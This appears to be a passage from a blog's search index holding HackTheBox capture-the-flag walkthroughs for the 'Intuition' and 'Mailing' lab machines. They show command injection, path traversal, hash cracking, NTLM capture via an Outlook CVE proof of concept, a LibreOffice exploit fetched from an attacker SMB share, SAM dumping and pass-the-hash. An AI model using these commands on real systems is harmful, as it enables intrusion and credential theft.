password.\u0026#34;],\u0026#34;reply_received\u0026#34;:\u0026#34;yes\u0026#34;}} /var/log/suricata/eve.json.7.gz:{\u0026#34;timestamp\u0026#34;:\u0026#34;2023-09-28T17:44:48.188361+0000\u0026#34;,\u0026#34;flow_id\u0026#34;:1218304978677234,\u0026#34;in_iface\u0026#34;:\u0026#34;ens33\u0026#34;,\u0026#34;event_type\u0026#34;:\u0026#34;ftp\u0026#34;,\u0026#34;src_ip\u0026#34;:\u0026#34;192.168.227.229\u0026#34;,\u0026#34;src_port\u0026#34;:45760,\u0026#34;dest_ip\u0026#34;:\u0026#34;192.168.227.13\u0026#34;,\u0026#34;dest_port\u0026#34;:21,\u0026#34;proto\u0026#34;:\u0026#34;TCP\u0026#34;,\u0026#34;tx_id\u0026#34;:2,\u0026#34;community_id\u0026#34;:\u0026#34;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=\u0026#34;,\u0026#34;ftp\u0026#34;:{\u0026#34;command\u0026#34;:\u0026#34;PASS\u0026#34;,\u0026#34;command_data\u0026#34;:\u0026#34;Lopezz1992%123\u0026#34;,\u0026#34;completion_code\u0026#34;:[\u0026#34;230\u0026#34;],\u0026#34;reply\u0026#34;:[\u0026#34;Login successful.\u0026#34;],\u0026#34;reply_received\u0026#34;:\u0026#34;yes\u0026#34;}} I obtained the password for user \u0026ldquo;lopez.\u0026rdquo; It is Lopezz1992%123. I used this password to access the account of user \u0026ldquo;lopez.\u0026rdquo;\nI also gained access to FTP using:\n1 2 3 4 5 6 7 8 9 lopez@intuition:~$ ftp adam@127.0.0.1 Connected to 127.0.0.1. 220 pyftpdlib 1.5.7 ready. 331 Username ok, send password. Password: adam gray 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls I retrieved all the cool stuff from there using the get \u0026lt;file_name\u0026gt; command:\npayload.txt runner1 runner1.c run-tests.sh The \u0026ldquo;run-tests.sh\u0026rdquo; file contains:\n1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash # List playbooks ./runner1 list # Run playbooks [Need authentication] # ./runner run [playbook number] -a [auth code] #./runner1 run 1 -a \u0026#34;UHI75GHI****\u0026#34; # Install roles [Need authentication] # ./runner install [role url] -a [auth code] #./runner1 install http://role.host.tld/role.tar -a \u0026#34;UHI75GHI****\u0026#34; The \u0026ldquo;runner1.c\u0026rdquo; file contains the authentication code, but it\u0026rsquo;s hashed in MD5. I will save it somewhere naming myhash.txt.\nI cracked the auth code from run-tests.sh file using the following command as we knew the first part of the authentication key **UHI75GHI******and the hash was available in runner1.c:\n1 hashcat.exe -a3 -m0 myhash.txt UHI75GHI?u?u?u?u --self-test-disable The cracked hash is UHI75GHINKOP.\nI created a file named \u0026ldquo;exploit.json\u0026rdquo; containing:\n1 2 3 4 5 6 7 { \u0026#34;run\u0026#34;:{ \u0026#34;action\u0026#34;:\u0026#34;install\u0026#34;, \u0026#34;role_file\u0026#34;:\u0026#34;file.tar\u0026#34; }, \u0026#34;auth_code\u0026#34;:\u0026#34;UHI75GHINKOP\u0026#34; } We know the injection point is role_file. We need to perform command injection from role_file now. I renamed my file from file.tar to file.tar;bash. Now, I will adjust the payload in exploit.json accordingly.\n1 2 3 4 5 6 7 { \u0026#34;run\u0026#34;:{ \u0026#34;action\u0026#34;:\u0026#34;install\u0026#34;, \u0026#34;role_file\u0026#34;:\u0026#34;file.tar;bash\u0026#34; }, \u0026#34;auth_code\u0026#34;:\u0026#34;UHI75GHINKOP\u0026#34; } I ran sudo /opt/runner2/runner2 exploit.json again.\n1 2 3 4 5 root@intuition:/home/lopez# cd ~ root@intuition:~# cat root.txt [ROOT_FLAG_R3DACT3D] root@intuition:~# id uid=0(root) gid=0(root) groups=0(root) Boom! We now have root access. üéâüöÄ\nConclusion Thanks for following along with my walkthrough! Using various tools and techniques, we successfully identified vulnerabilities, exploited them, and gained root access. Keep exploring and happy hacking!\n","permalink":"http://localhost:1313/writeups/hackthebox/intuition/","summary":"Intuition is a hard Linux machine that starts with a CSRF attack and Python urllib CVE-2023-24329 to access server files and source code. Foothold leads to FTP access via LFI, with root gained by reversing a custom binary and exploiting Ansible CVE-2023-5115 for path traversal.","title":"Intuition Writeup - HackTheBox"},{"content":" Link: https://app.hackthebox.com/machines/Mailing Difficulty Easy Machine Windows Enumeration Nmap\nI ran Nmap with the command nmap 10.10.11.14 -vv -p- -T4. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 PORT STATE SERVICE REASON 25/tcp open smtp syn-ack 80/tcp open http syn-ack 110/tcp open pop3 syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 143/tcp open imap syn-ack 445/tcp open microsoft-ds syn-ack 465/tcp open smtps syn-ack 587/tcp open submission syn-ack 993/tcp open imaps syn-ack 5040/tcp open unknown syn-ack 5985/tcp open wsman syn-ack 7680/tcp open pando-pub syn-ack 47001/tcp open winrm syn-ack 49664/tcp open unknown syn-ack 49665/tcp open unknown syn-ack 49666/tcp open unknown syn-ack 49667/tcp open unknown syn-ack 55959/tcp open unknown syn-ack During the aggressive scan, I used the command nmap 10.10.11.14 -vv -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,55959 -T4 -A. While Nmap was busy scanning, I focused my attention on examining the HTTP server. The detailed scan provided me with comprehensive information about the target machine\u0026rsquo;s services and configurations.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 PORT STATE SERVICE REASON VERSION 25/tcp open smtp syn-ack hMailServer smtpd | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 80/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Mailing 110/tcp open pop3 syn-ack hMailServer pop3d |_pop3-capabilities: USER TOP UIDL 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 143/tcp open imap syn-ack hMailServer imapd |_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK 445/tcp open microsoft-ds? syn-ack 465/tcp open ssl/smtp syn-ack hMailServer smtpd | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 587/tcp open smtp syn-ack hMailServer smtpd |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- | smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 993/tcp open ssl/imap syn-ack hMailServer imapd |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- |_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK 5040/tcp open unknown syn-ack 5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 7680/tcp open pando-pub? syn-ack 47001/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc syn-ack Microsoft Windows RPC 49665/tcp open msrpc syn-ack Microsoft Windows RPC 49666/tcp open msrpc syn-ack Microsoft Windows RPC 49667/tcp open msrpc syn-ack Microsoft Windows RPC 55959/tcp filtered unknown no-response Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 29452/tcp): CLEAN (Timeout) | Check 2 (port 39838/tcp): CLEAN (Timeout) | Check 3 (port 37492/udp): CLEAN (Timeout) | Check 4 (port 25477/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2024-05-05T11:59:54 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: -4m48s After several attempts of searching for LFI (Local File Inclusion) vulnerabilities, I decided to click on an obvious download button. Surprisingly, this approach actually worked, leading me to further exploit the system.\nI stumbled upon an intriguing configuration file path while analyzing the payload: ..\\..\\..\\..\\..\\..\\..\\Program%20Files%20(x86)\\hMailServer\\Bin\\hMailServer.INI. This discovery was inspired by an old exploit I found at https://www.exploit-db.com/exploits/7012. Essentially, this exploit provided me with the file structure for locating the hMailServer, specifically the hMailServer.INI file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [Directories] ProgramFolder=C:\\Program Files (x86)\\hMailServer DatabaseFolder=C:\\Program Files (x86)\\hMailServer\\Database DataFolder=C:\\Program Files (x86)\\hMailServer\\Data LogFolder=C:\\Program Files (x86)\\hMailServer\\Logs TempFolder=C:\\Program Files (x86)\\hMailServer\\Temp EventFolder=C:\\Program Files (x86)\\hMailServer\\Events [GUILanguages] ValidLanguages=english,swedish [Security] AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7 [Database] Type=MSSQLCE Username= Password=0a9f8ad8bf896b501dde74f08efd7e4c PasswordEncryption=1 Port=0 Server= Database=hMailServer Internal=1 I attempted to crack the MD5 hashes using hashcat with the command hashcat.exe -m0 myhash.txt rockyou.txt. Fortunately, I successfully cracked one of the hashes, revealing the Administrator Password as homenetworkingadministrator.\nHowever, the second hash proved to be resistant to cracking. After some research on Google, I came across a tool called hMailDatabasePasswordDecrypter, available at https://github.com/GitMirar/hMailDatabasePasswordDecrypter. This tool specializes in decrypting blowfish-encrypted hMail database passwords.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB] ‚îî‚îÄ# git clone https://github.com/GitMirar/hMailDatabasePasswordDecrypter.git Cloning into \u0026#39;hMailDatabasePasswordDecrypter\u0026#39;... remote: Enumerating objects: 8, done. remote: Total 8 (delta 0), reused 0 (delta 0), pack-reused 8 Receiving objects: 100% (8/8), 9.53 KiB | 1.36 MiB/s, done. ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB] ‚îî‚îÄ# cd hMailDatabasePasswordDecrypter ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/hMailDatabasePasswordDecrypter] ‚îî‚îÄ# ls blowfish.cpp blowfish.h blowfish.h2 main.cpp Makefile README.md ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/hMailDatabasePasswordDecrypter] ‚îî‚îÄ# make g++ blowfish.cpp main.cpp -o decrypt ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/hMailDatabasePasswordDecrypter] ‚îî‚îÄ# ./decrypt 0a9f8ad8bf896b501dde74f08efd7e4c 6FC6F69152AD Following the steps outlined in the GitHub README page, I attempted to crack the password successfully. However, when I tried to connect to the POP3 server using Telnet, I encountered difficulties as it wasn\u0026rsquo;t functioning as expected.\nUser Root After further enumeration regarding hMailServer, I came across an exploit that could be useful, available at https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6. Following the steps outlined in the CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability GitHub repository at https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability, I proceeded to run Responder on my Kali machine using the command sudo responder -I tun0.\n(Note: If Responder doesn\u0026rsquo;t return the hashes, you can use smbserver as suggested in the proof of concept on the GitHub page. I initially encountered the same issue, but after several attempts, it worked for me.)\nAfter running Responder, I executed the following command:\n1 2 3 4 5 6 7 ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/Mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability] ‚îî‚îÄ# python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient mayay email pls look hi\u0026#39; CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC. Alexander Hagenah / @xaitax / ah@primepage.de ‚úÖ Email sent successfully. After sending the email, I monitored Responder, and to my satisfaction, I observed that it captured a user hash.\n1 maya::MAILING:dac4fe0aec512cccracked the above hash with the following command:\n1 hashcat.exe -m 5600 myhash.txt rockyou.txt --self-test-disable Our password is: m4y4ngs4ri. I used this password with the following command to establish a shell: evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri. This successfully granted me access to the system, and I was able to retrieve the user flag.\nRoot Flag I came across LibreOffice installed in the Program Files directory, and upon further investigation, I discovered a CVE associated with its version: CVE-2023-2255 (https://github.com/elweth-sec/CVE-2023-2255).\nTo exploit this vulnerability, I executed the following Python code:\n1 python3 CVE-2023-2255.py --cmd \u0026#39;net localgroup Administrators maya /add\u0026#39; --output \u0026#39;exploit.odt\u0026#39; This generated an exploit file named exploit.odt.\nNext, I launched an Impacket SMB server using the command:\n1 impacket-smbserver mailing `pwd` -smb2support Then, within the Evil-WinRM shell, I executed the following commands:\n1 2 net use \\\\10.10.14.98\\mailing copy \\\\10.10.14.98\\mailing\\exploit.odt These commands allowed me to access the exploit file from the SMB server.\nAfter copying the exploit.odt file from the SMB server, I waited for a few moments. Then, to confirm that the user maya had elevated privileges to administrator, I executed the command net user maya.\nWith confirmation of elevated privileges, I proceeded to dump the hashes using the crackmapexec command:\n1 crackmapexec smb 10.10.11.14 -u maya -p \u0026#34;m4y4ngs4ri\u0026#34; --sam This command allowed me to retrieve the SAM (Security Account Manager) database hashes from the target system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ crackmapexec smb 10.10.11.14 -u maya -p \u0026#34;m4y4ngs4ri\u0026#34; --sam [*] First time use detected [*] Creating home directory structure [*] Creating default workspace [*] Initializing FTP protocol database [*] Initializing SSH protocol database [*] Initializing SMB protocol database [*] Initializing WINRM protocol database [*] Initializing LDAP protocol database [*] Initializing RDP protocol database [*] Initializing MSSQL protocol database [*] Copying default configuration file [*] Generating SSL certificate SMB 10.10.11.14 445 MAILING [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False) SMB 10.10.11.14 445 MAILING [+] MAILING\\maya:m4y4ngs4ri (Pwn3d!) SMB 10.10.11.14 445 MAILING [+] Dumping SAM hashes SMB 10.10.11.14 445 MAILING Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c::: SMB 10.10.11.14 445 MAILING localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae::: SMB 10.10.11.14 445 MAILING maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af::: SMB 10.10.11.14 445 MAILING [+] Added 6 SAM hashes to the database Now, to gain root access to the box without cracking the hash, I can log in using the hash we previously dumped.\nI\u0026rsquo;ll use the following command with impacket-wmiexec:\n1 impacket-wmiexec localadmin@10.10.11.14 -hashes \u0026#34;aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae\u0026#34; This command will authenticate me as the local administrator using the hashed credentials we obtained earlier, granting us root access to the box.\nThere we go! We now have access to the local administrator account. We\u0026rsquo;ve successfully rooted this easy Windows box. Great job!\nConclusion: Thanks for reading my walkthrough. Hacking through the challenges presented by this box has been an enriching experience. Happy Hacking! ü´°\n","permalink":"http://localhost:1313/writeups/hackthebox/mailing/","summary":"Mailing is an easy Windows machine using path traversal to access hMailServer configs and crack the admin email password. Access to user maya is gained via CVE-2024-21413 to capture and crack NTLM, with root obtained by exploiting LibreOffice CVE-2023-2255.","title":"Mailing Writeup - HackTheBox"}]